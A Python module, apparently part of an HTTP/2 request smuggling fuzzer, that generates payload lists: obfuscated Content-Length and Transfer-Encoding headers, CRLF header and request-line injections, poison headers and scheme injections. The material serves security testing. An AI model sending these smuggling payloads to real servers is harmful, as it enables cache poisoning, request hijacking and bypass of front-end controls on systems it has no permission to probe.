
# * content-length插入unicode(0x1-0x21)
def gen_cl1():
    cl1 = []
    for i in range(0x1,0x21):
        cl1.append(["content-length","%c1"%(i)]) 
        cl1.append(["content-length","1%c"%(i)])
        cl1.append(["content-length%c"%(i),"1"])
        cl1.append(["%ccontent-length"%(i),"1"])
     
        cl1.append(["X: X%ccontent-length"%(i),"1"])
        cl1.append(["content-length", "1%cX: X"%(i)])
        cl1.append(["X: X\r%ccontent-length"%(i),"1"])
        cl1.append(["X: X%c\ncontent-length"%(i), "1"])
        cl1.append(["content-length","1\r%cX: X"%(i)])
        cl1.append(["content-length", "1%c\nX: X"%(i)])

        cl1.append(["%ccontent-length%c"%(i,i), "1"])
        cl1.append(["%ccontent-length"%(i),"%c1"%(i)])
        cl1.append(["%ccontent-length"%(i),"1%c"%(i)])
        cl1.append(["content-length%c"%(i),"%c1"%(i)])
        cl1.append(["content-length%c"%(i), "1%c"%(i)])
        cl1.append(["content-length","%c1%c"%(i,i)])
        
        # "-"to"_"
        cl1.append(["content_length","%c1"%(i)]) 
        cl1.append(["content_length","1%c"%(i)])
        cl1.append(["content_length%c"%(i),"1"])
        cl1.append(["%ccontent_length"%(i),"1"])
     
        cl1.append(["X: X%ccontent_length"%(i),"1"])
        cl1.append(["content_length", "1%cX: X"%(i)])
        cl1.append(["X: X\r%ccontent_length"%(i),"1"])
        cl1.append(["X: X%c\ncontent_length"%(i), "1"])
        cl1.append(["content_length","1\r%cX: X"%(i)])
        cl1.append(["content_length", "1%c\nX: X"%(i)])

        cl1.append(["%ccontent_length%c"%(i,i), "1"])
        cl1.append(["%ccontent_length"%(i),"%c1"%(i)])
        cl1.append(["%ccontent_length"%(i),"1%c"%(i)])
        cl1.append(["content_length%c"%(i),"%c1"%(i)])
        cl1.append(["content_length%c"%(i), "1%c"%(i)])
        cl1.append(["content_length","%c1%c"%(i,i)])
    return cl1

# * content-length插入unicode(0x7F,0x100)
def gen_cl2():
    cl2 = []
    for i in range(0x7F,0x100):
        cl2.append(["content-length","%c1"%(i)]) 
        cl2.append(["content-length","1%c"%(i)])
        cl2.append(["content-length%c"%(i),"1"])
        cl2.append(["%ccontent-length"%(i),"1"])

        cl2.append(["X: X%ccontent-length"%(i),"1"])
        cl2.append(["content-length", "1%cX: X"%(i)])
        cl2.append(["X: X\r%ccontent-length"%(i),"1"])
        cl2.append(["X: X%c\ncontent-length"%(i), "1"])
        cl2.append(["content-length","1\r%cX: X"%(i)])
        cl2.append(["content-length", "1%c\nX: X"%(i)])

        cl2.append(["%ccontent-length%c"%(i,i), "1"])
        cl2.append(["%ccontent-length"%(i),"%c1"%(i)])
        cl2.append(["%ccontent-length"%(i),"1%c"%(i)])
        cl2.append(["content-length%c"%(i),"%c1"%(i)])
        cl2.append(["content-length%c"%(i), "1%c"%(i)])
        cl2.append(["content-length","%c1%c"%(i,i)])

        # "-"to"_"
        cl2.append(["content_length","%c1"%(i)]) 
        cl2.append(["content_length","1%c"%(i)])
        cl2.append(["content_length%c"%(i),"1"])
        cl2.append(["%ccontent_length"%(i),"1"])
     
        cl2.append(["X: X%ccontent_length"%(i),"1"])
        cl2.append(["content_length", "1%cX: X"%(i)])
        cl2.append(["X: X\r%ccontent_length"%(i),"1"])
        cl2.append(["X: X%c\ncontent_length"%(i), "1"])
        cl2.append(["content_length","1\r%cX: X"%(i)])
        cl2.append(["content_length", "1%c\nX: X"%(i)])

        cl2.append(["%ccontent_length%c"%(i,i), "1"])
        cl2.append(["%ccontent_length"%(i),"%c1"%(i)])
        cl2.append(["%ccontent_length"%(i),"1%c"%(i)])
        cl2.append(["content_length%c"%(i),"%c1"%(i)])
        cl2.append(["content_length%c"%(i), "1%c"%(i)])
        cl2.append(["content_length","%c1%c"%(i,i)])
    return cl2
def gen_cl3():
    cl3 = []
    cl3.append(["content-length","0+"])
    cl3.append(["content-length","5"])
    return cl3
# * Transfer-Encoding插入unicode(0x1-0x21)
def gen_te1():
    te1 = []
    for i in range(0x1,0x21):
        # cl1.append(["content-length","%c1"%(i)]) 
        te1.append(["%cTransfer-Encoding"%(i),"chunked"])
        te1.append(["Transfer-Encoding%c"%(i),"chunked"])
        te1.append(["Transfer-Encoding","%cchunked"%(i)])
        te1.append(["Transfer-Encoding","chunked%c"%(i)])

        te1.append(["X: X%cTransfer-Encoding"%(i),"chunked"])
        te1.append(["Transfer-Encoding","chunked%cX: X"%(i)])
        te1.append(["X: X\r%cTransfer-Encoding"%(i),"chunked"])
        te1.append(["X: X%c\nTransfer-Encoding"%(i),"chunked"])
        te1.append(["Transfer-Encoding", "chunked\r%cX: X"%(i)])
        te1.append(["Transfer-Encoding", "chunked%c\nX: X"%(i)])

        te1.append(["%cTransfer-Encoding%c"%(i,i),"chunked"])
        te1.append(["%cTransfer-Encoding"%(i),"%cchunked"%(i)])
        te1.append(["%cTransfer-Encoding"%(i),"chunked%c"%(i)])
        te1.append(["Transfer-Encoding%c"%(i),"%cchunked"%(i)])
        te1.append(["Transfer-Encoding%c"%(i),"chunked%c"%(i)])
        te1.append(["Transfer-Encoding","%cchunked%c"%(i,i)])

        # "-"to"_"
        te1.append(["%cTransfer_Encoding"%(i),"chunked"])
        te1.append(["Transfer_Encoding%c"%(i),"chunked"])
        te1.append(["Transfer_Encoding","%cchunked"%(i)])
        te1.append(["Transfer_Encoding","chunked%c"%(i)])

        te1.append(["X: X%cTransfer_Encoding"%(i),"chunked"])
        te1.append(["Transfer_Encoding","chunked%cX: X"%(i)])
        te1.append(["X: X\r%cTransfer_Encoding"%(i),"chunked"])
        te1.append(["X: X%c\nTransfer_Encoding"%(i),"chunked"])
        te1.append(["Transfer_Encoding", "chunked\r%cX: X"%(i)])
        te1.append(["Transfer_Encoding", "chunked%c\nX: X"%(i)])

        te1.append(["%cTransfer_Encoding%c"%(i,i),"chunked"])
        te1.append(["%cTransfer_Encoding"%(i),"%cchunked"%(i)])
        te1.append(["%cTransfer_Encoding"%(i),"chunked%c"%(i)])
        te1.append(["Transfer_Encoding%c"%(i),"%cchunked"%(i)])
        te1.append(["Transfer_Encoding%c"%(i),"chunked%c"%(i)])
        te1.append(["Transfer_Encoding","%cchunked%c"%(i,i)])
    return te1

# * Transfer-Encoding插入unicode(0x7F,0x100)
def gen_te2():
    te2 = []
    for i in range(0x7F,0x100):
        te2.append(["%cTransfer-Encoding"%(i),"chunked"])
        te2.append(["Transfer-Encoding%c"%(i),"chunked"])
        te2.append(["Transfer-Encoding","%cchunked"%(i)])
        te2.append(["Transfer-Encoding","chunked%c"%(i)])

        te2.append(["X: X%cTransfer-Encoding"%(i),"chunked"])
        te2.append(["Transfer-Encoding","chunked%cX: X"%(i)])
        te2.append(["X: X\r%cTransfer-Encoding"%(i),"chunked"])
        te2.append(["X: X%c\nTransfer-Encoding"%(i),"chunked"])
        te2.append(["Transfer-Encoding", "chunked\r%cX: X"%(i)])
        te2.append(["Transfer-Encoding", "chunked%c\nX: X"%(i)])

        te2.append(["%cTransfer-Encoding%c"%(i,i),"chunked"])
        te2.append(["%cTransfer-Encoding"%(i),"%cchunked"%(i)])
        te2.append(["%cTransfer-Encoding"%(i),"chunked%c"%(i)])
        te2.append(["Transfer-Encoding%c"%(i),"%cchunked"%(i)])
        te2.append(["Transfer-Encoding%c"%(i),"chunked%c"%(i)])
        te2.append(["Transfer-Encoding","%cchunked%c"%(i,i)])
        # "-"to"_"

        te2.append(["%cTransfer_Encoding"%(i),"chunked"])
        te2.append(["Transfer_Encoding%c"%(i),"chunked"])
        te2.append(["Transfer_Encoding","%cchunked"%(i)])
        te2.append(["Transfer_Encoding","chunked%c"%(i)])

        te2.append(["X: X%cTransfer_Encoding"%(i),"chunked"])
        te2.append(["Transfer_Encoding","chunked%cX: X"%(i)])
        te2.append(["X: X\r%cTransfer_Encoding"%(i),"chunked"])
        te2.append(["X: X%c\nTransfer_Encoding"%(i),"chunked"])
        te2.append(["Transfer_Encoding", "chunked\r%cX: X"%(i)])
        te2.append(["Transfer_Encoding", "chunked%c\nX: X"%(i)])

        te2.append(["%cTransfer_Encoding%c"%(i,i),"chunked"])
        te2.append(["%cTransfer_Encoding"%(i),"%cchunked"%(i)])
        te2.append(["%cTransfer_Encoding"%(i),"chunked%c"%(i)])
        te2.append(["Transfer_Encoding%c"%(i),"%cchunked"%(i)])
        te2.append(["Transfer_Encoding%c"%(i),"chunked%c"%(i)])
        te2.append(["Transfer_Encoding","%cchunked%c"%(i,i)])
    return te2

# *将"Transfer-Encoding: chunked"中的"s"替换为"\u017f"或"k"替换为"\u212a"
def gen_te3():
    te3=[]
    te3.append(["Tran\u017ffer-Encoding","chunked"])
    te3.append(["Transfer-Encoding","chun\u212aed"])
    te3.append(["Transfer-Encoding","chunked"])
    te3.append(["transfer-encoding","chunked"])
    return te3


        
# *在header value利用"\r\n" "\r" "\n"的插入header
# *有两种形式
# *一种直接插入"X:x" "X: x"
# *另一种插入"X:-00000000x" "X:000000x" "X: -00000000x" "X: 000000x"(不知道插入10个0有什么用但是http2smugl试了这种办法)
def gen_header_value_newline_inject_payload():
    header_value_newline_inject_list = [["foo","bar\r\nX:x"],["foo","bar\rX:x"],["foo","bar\nX:x"],
    ["foo","bar\r\nX: x"],["foo","bar\rX: x"],["foo","bar\nX: x"],
    ["foo","bar\r\nX:-00000000000x"],["foo","bar\rX:-00000000000x"],["foo","bar\nX:-00000000000x"],
    ["foo","bar\r\nX: -00000000000x"],["foo","bar\rX: -00000000000x"],["foo","bar\nX: -00000000000x"],
    ["foo","bar\r\nX:00000000000x"],["foo","bar\rX:00000000000x"],["foo","bar\nX:00000000000x"],
    ["foo","bar\r\nX: 00000000000x"],["foo","bar\rX: 00000000000x"],["foo","bar\nX: 00000000000x"]]
    return header_value_newline_inject_list

# *在header name利用"\r\n" "\r" "\n"的插入header
def gen_header_name_newline_inject_payload():
    header_name_newline_inject_list = [["X:x\r\nfoo","bar"],["X:x\rfoo","bar"],["X:x\nfoo","bar"],
                                    ["X: x\r\nfoo","bar"],["X: x\rfoo","bar"],["X: x\nfoo","bar"]]
    return header_name_newline_inject_list

# *header name带前空格的有毒header 转换成HTTP/1之后会折叠
def gen_poison_header_inject_payload():
    poison_header_list = [[" posion", "x"],["\x00posion", "x"],["\tposion", "x"], 
                          ["\vposion", "x"],["\u0085posion", "x"],["\u00A0posion", "x"],["\U000130BAposion", "x"]]
    return poison_header_list

# * 通过scheme字段注入url前缀
def gen_scheme_inject_payload():
    scheme_inject_list = ["http://a.example.com?", "https://a.example.com?"]
    return scheme_inject_list

# *通过method字段注入请求行
def gen_method_inject_payload():
    method_inject_list = ["GET / HTTP/1.1\r\nTransfer-encoding:chunked\r\nx:x","GET / HTTP/1.1\rTransfer-encoding:chunked\rx:x","GET / HTTP/1.1\nTransfer-encoding:chunked\nx:x",
                                                 "GET / HTTP/1.1\r\nTransfer-encoding: chunked\r\nx: x","GET / HTTP/1.1\rTransfer-encoding: chunked\rx: x","GET / HTTP/1.1\nTransfer-encoding: chunked\nx: x"]
    return method_inject_list

# *通过path字段注入请求行
def gen_path_inject_patload():
    path_inject_list = ["/ HTTP/1.1\r\nHost:127.0.0.1\r\n\r\nGET / HTTP/1.1\r\nx:x","/ HTTP/1.1\rHost:127.0.0.1\r\rGET / HTTP/1.1\rx:x","/ HTTP/1.1\nHost:127.0.0.1\n\nGET / HTTP/1.1\nx:x",
                        "/ HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\nGET / HTTP/1.1\r\nx: x","/ HTTP/1.1\rHost: 127.0.0.1\r\rGET / HTTP/1.1\rx: x","/ HTTP/1.1\nHost: 127.0.0.1\n\nGET / HTTP/1.1\nx: x"]
    return path_inject_list


# *所有Transfer-encoding插入unicode
def gen_all_te():
    te = []
    te.extend(gen_te1())
    te.extend(gen_te2())
    te.extend(gen_te3())
    return te

# *所有content-length插入unicode
def gen_all_cl():
    cl = []
    cl.extend(gen_cl3())
    cl.extend(gen_cl1())
    cl.extend(gen_cl2())

    return cl
if __name__ == "__main__":
    print("test")